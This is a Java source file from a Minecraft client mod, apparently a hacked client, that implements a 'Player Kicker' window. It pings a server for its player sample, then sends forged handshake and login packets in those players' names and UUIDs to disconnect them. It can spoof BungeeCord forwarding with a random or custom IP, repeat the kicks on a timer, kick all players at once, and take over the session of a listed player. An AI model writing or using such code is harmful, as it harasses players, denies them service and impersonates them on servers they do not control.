/*
 * This file is part of Vandalism - https://github.com/NekosAreKawaii/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, FooFieOwO, Recyz and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.clientwindow.impl;

import com.viaversion.viaversion.api.protocol.version.ProtocolVersion;
import com.viaversion.viaversion.api.protocol.version.VersionType;
import de.nekosarekawaii.vandalism.Vandalism;
import de.nekosarekawaii.vandalism.clientwindow.template.StateClientWindow;
import de.nekosarekawaii.vandalism.clientwindow.template.widgets.datalist.DataListWidget;
import de.nekosarekawaii.vandalism.clientwindow.template.widgets.datalist.dataentry.DataEntry;
import de.nekosarekawaii.vandalism.clientwindow.template.widgets.datalist.dataentry.impl.ListDataEntry;
import de.nekosarekawaii.vandalism.clientwindow.template.widgets.field.IPPortFieldWidget;
import de.nekosarekawaii.vandalism.util.*;
import de.nekosarekawaii.vandalism.util.imgui.ImUtils;
import imgui.ImGui;
import imgui.flag.ImGuiComboFlags;
import imgui.type.ImBoolean;
import imgui.type.ImInt;
import imgui.type.ImString;
import net.lenni0451.mcping.MCPing;
import net.lenni0451.mcping.exception.ConnectTimeoutException;
import net.lenni0451.mcping.exception.ConnectionRefusedException;
import net.lenni0451.mcping.exception.DataReadException;
import net.lenni0451.mcping.exception.PacketReadException;
import net.lenni0451.mcping.responses.MCPingResponse;
import net.minecraft.SharedConstants;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.util.Pair;

import java.io.DataOutputStream;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class PlayerKickerClientWindow extends StateClientWindow implements DataListWidget, IPPortFieldWidget {

    private final ImString ip = this.createImIP();
    private final ImInt port = this.createImPort();

    private final ImBoolean preventSelfKick = new ImBoolean(true);
    private final ImBoolean preventFriendKick = new ImBoolean(true);
    private final ImBoolean spoofBungeeCord = new ImBoolean(false);
    private final ImBoolean customizeIP = new ImBoolean(false);
    private final ImString customIP = new ImString();
    private final ImBoolean intervalKick = new ImBoolean(false);
    private final ImInt intervalDelay = new ImInt(30000);
    private final ImInt kickDelay = new ImInt(1000);

    private boolean checking = false;
    private MCPingResponse.Players players = null;
    private int protocol = SharedConstants.getProtocolVersion();
    private int friends = 0;
    private int anonymousPlayers = 0;
    private final MSTimer intervalTimer = new MSTimer();

    private final ExecutorService executorService = Executors.newSingleThreadExecutor();

    private final CopyOnWriteArrayList<ListDataEntry> playerDataEntries = new CopyOnWriteArrayList<>();
    private final CopyOnWriteArrayList<ListDataEntry> intervalDataEntries = new CopyOnWriteArrayList<>();

    public PlayerKickerClientWindow() {
        super("Player Kicker", Category.SERVER, 600f, 650f);
    }

    @Override
    protected void onRender(final DrawContext context, final int mouseX, final int mouseY, final float delta) {
        super.onRender(context, mouseX, mouseY, delta);
        final String id = "##" + this.getName();
        if (!this.checking) {
            this.renderField(id);
            ImGui.checkbox("Prevent Self Kick" + id + "preventSelfKick", this.preventSelfKick);
            ImGui.sameLine();
            ImGui.textDisabled("(?)");
            if (ImGui.isItemHovered()) {
                ImGui.beginTooltip();
                ImGui.text("Red highlighted");
                ImGui.endTooltip();
            }
            ImGui.sameLine();
            ImGui.checkbox("Prevent Friend Kick" + id + "preventFriendKick", this.preventFriendKick);
            ImGui.sameLine();
            ImGui.textDisabled("(?)");
            if (ImGui.isItemHovered()) {
                ImGui.beginTooltip();
                ImGui.text("Orange highlighted");
                ImGui.endTooltip();
            }
            ImGui.sameLine();
            ImGui.checkbox("Spoof BungeeCord" + id + "spoofBungeeCord", this.spoofBungeeCord);
            if (this.spoofBungeeCord.get()) {
                ImGui.sameLine();
                ImGui.checkbox("Customize IP" + id + "customizeIP", this.customizeIP);
                if (this.customizeIP.get()) {
                    ImGui.text("Custom IP");
                    ImGui.setNextItemWidth(-1);
                    ImGui.inputText(id + "customIP", this.customIP);
                }
            }
            ImGui.checkbox("Interval Kick" + id + "intervalKick", this.intervalKick);
            ImGui.sameLine();
            ImGui.textDisabled("(?)");
            if (ImGui.isItemHovered()) {
                ImGui.beginTooltip();
                ImGui.text("Yellow highlighted");
                ImGui.endTooltip();
            }
            if (this.intervalKick.get()) {
                ImGui.text("Interval Delay (ms)");
                ImGui.setNextItemWidth(-1);
                ImGui.inputInt(id + "intervalDelay", this.intervalDelay);
            }
            ImGui.text("Version");
            ImGui.sameLine(ImGui.getColumnWidth() / 2f + 25f);
            ImGui.text("Kick Delay (ms)");
            ImGui.setNextItemWidth(ImGui.getColumnWidth() / 2f);
            if (ImGui.beginCombo(id + "version", ProtocolVersion.getProtocol(this.protocol).getName(), ImGuiComboFlags.HeightLargest)) {
                final List<Integer> protocols = new ArrayList<>();
                for (final ProtocolVersion protocolVersion : ProtocolVersion.getProtocols()) {
                    if (protocolVersion.getVersionType() == VersionType.RELEASE && protocolVersion.newerThanOrEqualTo(ProtocolVersion.v1_8) && !protocolVersion.equalTo(ProtocolVersion.v1_19) && !protocolVersion.equalTo(ProtocolVersion.v1_19_1)) {
                        protocols.add(protocolVersion.getVersion());
                    }
                }
                for (int i = protocols.size() - 1; i > -1; i--) {
                    final int protocol = protocols.get(i);
                    final String protocolVersionName = ProtocolVersion.getProtocol(protocol).getName();
                    if (ImGui.selectable(protocolVersionName, protocolVersionName.equals(ProtocolVersion.getProtocol(this.protocol).getName()))) {
                        this.protocol = protocol;
                    }
                }
                ImGui.endCombo();
            }
            ImGui.sameLine();
            ImGui.setNextItemWidth(-1);
            ImGui.inputInt(id + "delay", this.kickDelay);
            ImGui.spacing();
            if (ImUtils.subButton("Check" + id + "check")) {
                this.checking = true;
                this.setState(PingState.WAITING_RESPONSE.getMessage());
                this.players = null;
                this.friends = 0;
                this.anonymousPlayers = 0;
                this.playerDataEntries.clear();
                this.intervalDataEntries.clear();
                this.intervalTimer.reset();
                MCPing.pingModern(SharedConstants.getProtocolVersion())
                        .address(this.getImIP().get(), this.getImPort().get())
                        .timeout(5000, 5000)
                        .exceptionHandler(t -> {
                            this.checking = false;
                            switch (t) {
                                case UnknownHostException unknownHostException ->
                                        this.setState(PingState.UNKNOWN_HOST.getMessage());
                                case ConnectionRefusedException connectionRefusedException ->
                                        this.setState(PingState.CONNECTION_REFUSED.getMessage());
                                case ConnectTimeoutException connectTimeoutException ->
                                        this.setState(PingState.CONNECTION_TIMED_OUT.getMessage());
                                case DataReadException dataReadException ->
                                        this.setState(PingState.DATA_READ_FAILED.getMessage());
                                case PacketReadException packetReadException ->
                                        this.setState(PingState.PACKET_READ_FAILED.getMessage());
                                case null, default -> {
                                    this.setState(PingState.FAILED.getMessage());
                                    Vandalism.getInstance().getLogger().error("Failed to ping {}:{}", this.getImIP().get(), this.getImPort().get(), t);
                                }
                            }
                        }).finishHandler(response -> {
                            this.checking = false;
                            this.setState(PingState.SUCCESS.getMessage());
                            this.players = response.players;
                            if (this.players != null && this.players.sample != null) {
                                final MCPingResponse.Players.Player[] sample = this.players.sample;
                                if (sample.length == 0) {
                                    this.players = null;
                                    return;
                                }
                                for (final MCPingResponse.Players.Player player : sample) {
                                    if (ServerUtil.isAnonymous(player.name, player.id)) {
                                        this.anonymousPlayers++;
                                    } else if (Vandalism.getInstance().getFriendsManager().isFriend(player.name)) {
                                        this.friends++;
                                    }
                                    final CopyOnWriteArrayList<Pair<String, String>> list = new CopyOnWriteArrayList<>();
                                    list.add(new Pair<>("Name", player.name));
                                    list.add(new Pair<>("UUID", player.id));
                                    this.playerDataEntries.add(new ListDataEntry(list));
                                }
                            }
                            this.delayedResetState(10000);
                        }).getAsync();
            }
            ImGui.separator();
            if (this.players != null && this.players.sample != null) {
                ImGui.textWrapped("Players: " + this.players.online + "/" + this.players.max + " (" + this.players.sample.length + ")");
                if (this.anonymousPlayers > 0) {
                    ImGui.textWrapped("Anonymous Players: " + this.anonymousPlayers);
                }
                if (this.friends > 0) {
                    ImGui.textWrapped("Friends: " + this.friends);
                }
                if (this.intervalKick.get()) {
                    ImGui.text("Kicking Delay");
                    ImGui.sameLine();
                    ImGui.textDisabled("(?)");
                    if (ImGui.isItemHovered()) {
                        ImGui.beginTooltip();
                        ImGui.text("Will kick all selected players after the specified delay has passed.");
                        ImGui.endTooltip();
                    }
                    ImGui.progressBar(Percentage.percentage(this.intervalTimer.getDelta(), this.intervalDelay.get()) / 100f);
                }
                this.renderDataList(id + "playerList", -ImGui.getTextLineHeightWithSpacing() - 10, 45f, this.playerDataEntries);
                if (this.intervalKick.get()) {
                    if (this.intervalTimer.hasReached(this.intervalDelay.get(), true)) {
                        for (final ListDataEntry listDataEntry : this.intervalDataEntries) {
                            this.kickPlayer(listDataEntry.getFirst().getRight(), listDataEntry.getSecond().getRight());
                        }
                    }
                    if (ImGui.button("Select all players for Interval Kick" + id + "selectAllPlayersForIntervalKick", ImGui.getColumnWidth() / 2f, ImGui.getTextLineHeightWithSpacing())) {
                        this.intervalDataEntries.clear();
                        this.intervalDataEntries.addAll(this.playerDataEntries);
                    }
                    ImGui.sameLine();
                    if (ImUtils.subButton("Deselect all players from Interval Kick" + id + "deSelectAllPlayersFromIntervalKick")) {
                        this.intervalDataEntries.clear();
                    }
                } else {
                    if (ImUtils.subButton("Kick All Players" + id + "kickAllPlayers")) {
                        for (final MCPingResponse.Players.Player player : this.players.sample) {
                            this.kickPlayer(player.name, player.id);
                        }
                    }
                }
            } else {
                ImGui.text("No players found.");
            }
        }
    }

    @Override
    public ImString getImIP() {
        return this.ip;
    }

    @Override
    public ImInt getImPort() {
        return this.port;
    }

    @Override
    public boolean filterDataEntry(final DataEntry dataEntry) {
        if (dataEntry instanceof final ListDataEntry listDataEntry) {
            final String name = listDataEntry.getFirst().getRight(), uuid = listDataEntry.getSecond().getRight();
            final boolean isSelf = ServerUtil.isSelf(name, uuid), isFriend = Vandalism.getInstance().getFriendsManager().isFriend(name);
            return ServerUtil.isAnonymous(name, uuid) || (isSelf && this.preventSelfKick.get()) || (isFriend && this.preventFriendKick.get());
        }
        return false;
    }

    @Override
    public boolean shouldHighlightDataEntry(final DataEntry dataEntry) {
        if (dataEntry instanceof final ListDataEntry listDataEntry) {
            final String name = listDataEntry.getFirst().getRight(), uuid = listDataEntry.getSecond().getRight();
            final boolean isSelf = ServerUtil.isSelf(name, uuid), isFriend = Vandalism.getInstance().getFriendsManager().isFriend(name);
            return isSelf || isFriend || this.intervalDataEntries.contains(listDataEntry);
        }
        return false;
    }

    @Override
    public float[] getDataEntryHighlightColor(final DataEntry dataEntry) {
        float[] color = {0.8f, 0.1f, 0.1f, 0.30f};
        if (dataEntry instanceof final ListDataEntry listDataEntry) {
            if (Vandalism.getInstance().getFriendsManager().isFriend(listDataEntry.getFirst().getRight())) {
                color = new float[]{0.9f, 0.5f, 0.1f, 0.40f};
            } else if (this.intervalDataEntries.contains(listDataEntry)) {
                color = new float[]{0.9f, 0.9f, 0.1f, 0.40f};
            }
        }
        return color;
    }

    @Override
    public void onDataEntryClick(final DataEntry dataEntry) {
        if (dataEntry instanceof final ListDataEntry listDataEntry) {
            if (this.intervalKick.get()) {
                this.setState("Disable interval kick to kick players manually!");
                return;
            }
            this.kickPlayer(listDataEntry.getFirst().getRight(), listDataEntry.getSecond().getRight());
        }
    }

    @Override
    public void renderDataEntryContextMenu(final String id, final int index, final DataEntry dataEntry) {
        if (dataEntry instanceof final ListDataEntry listDataEntry) {
            final String name = listDataEntry.getFirst().getRight(), uuid = listDataEntry.getSecond().getRight();
            ImGui.text("Player: " + name);
            ImGui.separator();
            final float buttonWidth = ImUtils.modulateDimension(200), buttonHeight = ImUtils.modulateDimension(28);
            if (ImGui.button("Login" + id + "login", buttonWidth, buttonHeight)) {
                SessionUtil.setSessionAsync(name, uuid);
            }
            if (ImGui.button("Copy Data" + id + "copyData", buttonWidth, buttonHeight)) {
                this.mc.keyboard.setClipboard(dataEntry.getData());
            }
            final boolean contains = this.intervalDataEntries.contains(listDataEntry);
            if (ImGui.button("Interval Kick: " + (contains ? "On" : "Off") + id + "intervalKick", buttonWidth, buttonHeight)) {
                if (contains) this.intervalDataEntries.remove(listDataEntry);
                else this.intervalDataEntries.add(listDataEntry);
            }
        }
    }

    private void kickPlayer(final String name, final String uuid) {
        if ((ServerUtil.isSelf(name, uuid) && this.preventSelfKick.get()) || (Vandalism.getInstance().getFriendsManager().isFriend(name) && this.preventFriendKick.get())) {
            return;
        }
        this.executorService.submit(() -> {
            if (!name.isBlank() && !uuid.isBlank()) {
                try {
                    String ip = this.getImIP().get();
                    final int port = this.getImPort().get();
                    final int protocol = this.protocol;
                    this.setState("Kicking player " + name + "...");
                    Thread.sleep(this.kickDelay.get());
                    final Socket connection = new Socket(ip, port);
                    connection.setTcpNoDelay(true);
                    final DataOutputStream output = new DataOutputStream(connection.getOutputStream());
                    if (this.spoofBungeeCord.get()) {
                        ip += "\u0000";
                        if (this.customizeIP.get()) {
                            ip += this.customIP.get();
                        } else {
                            ip += PacketHelper.getRandomIpPart() + "." + PacketHelper.getRandomIpPart() + "." + PacketHelper.getRandomIpPart() + "." + PacketHelper.getRandomIpPart();
                        }
                        ip += "\u0000";
                        ip += uuid.replace("-", "");
                    }
                    PacketHelper.writePacket(PacketHelper.createHandshakePacket(protocol, ip, port), output);
                    PacketHelper.writePacket(PacketHelper.createLoginPacket(protocol, name, UUID.fromString(uuid)), output);
                    Thread.sleep(1000);
                    connection.close();
                    this.setState("Player " + name + " should be kicked.");
                } catch (final Exception ignored) {
                    this.setState("Failed to kick player " + name + ".");
                }
            } else {
                this.setState("Invalid player data.");
            }
        });
    }

}
